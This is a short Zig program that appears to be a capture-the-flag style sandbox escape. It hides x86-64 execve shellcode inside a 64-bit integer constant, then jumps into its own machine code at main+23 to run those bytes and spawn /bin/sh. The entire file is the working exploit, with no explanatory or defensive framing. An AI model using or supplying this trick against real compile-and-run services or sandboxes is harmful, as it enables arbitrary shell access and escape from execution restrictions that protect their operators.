pub fn main() void {
    const a: u64 = 0x50f583b6a;
    const args = [_]u64{ @intFromPtr("/bin/sh\x00"), 0 };
    const rdi = args[0];
    const rsi = @intFromPtr(&args);
    const rdx: u64 = 0;
    const mainAddr: u64 = @intFromPtr(&main);
    const execve: *const fn (u64, u64, u64, u64) void = @ptrFromInt(mainAddr + 23);
    execve(rdi, rsi, rdx, a);
}
